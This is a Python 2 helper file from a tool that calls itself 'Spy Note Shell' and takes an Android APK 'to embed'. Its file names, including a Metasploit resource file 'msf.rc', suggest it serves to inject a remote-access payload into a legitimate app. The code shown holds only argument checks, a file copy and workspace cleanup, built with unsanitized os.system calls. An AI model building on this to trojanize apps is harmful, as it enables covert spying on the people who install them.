
#    Copyright (C) <2016> 
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

# Created by H0nus

import sys
from core import pycolor
import os

pyc = pycolor.pyColor()

def banner():
	print '''

 _____         _____     _       _____ _       _ _ 
|   __|___ _ _|   | |___| |_ ___|   __| |_ ___| | |
|__   | . | | | | | | . |  _| -_|__   |   | -_| | |
|_____|  _|_  |_|___|___|_| |___|_____|_|_|___|_|_|
      |_| |___|                                                                                                                    

%s				
'''%(pyc.cLine('LIGHTBLUE', "Spy Note Shell, created by H0nus"))

mainapk=None
def initstuff():
	argc = len(sys.argv)
	
	path=None
	if argc!=2:
		print pyc.Warn("Argument missing")
		print pyc.Info("Usage %s <apk-to-embed>")
		sys.exit()
	else:
		path=sys.argv[1]
		print(pyc.Info("Check file %s"%(path)))
		try:
			mainapk = path.split('/')[-1]
		except:
			pass
		
		if os.path.isfile(path):
			if os.access(path, os.R_OK):	
				print(pyc.Succ("File %s OK")%(path))
				if(mainapk.split('.')[-1]!='apk'):
					print(pyc.Warn("File(%s) doesn't appear to be application package, you want to continue?[y/n]"%mainapk))
					ch = raw_input("[y/n]> ")
					ch = ch.lower()
					if(ch=='y'):
						pass
					else:
						print(pyc.Warn("Exiting..."))
						sys.exit()						
			else:
				print(pyc.Err("Check the permissions"))
				sys.exit()
		else:
			print(pyc.Err("File(%s) doesnt exist"%(path)))
			sys.exit()
			
		z=os.system('cp %s %s'%(path, mainapk))
		if not (z):
			pass
		else:
			print pyc.Err("Couldn't make a copy of %s"%mainapk)
			sys.exit()
		
	return mainapk


def clean(mainapk):
	print pyc.Info("Cleaning workspace...")
	os.system('rm -rf temp.apk temp msf.rc %s %s'%(mainapk.split('.')[0],mainapk))



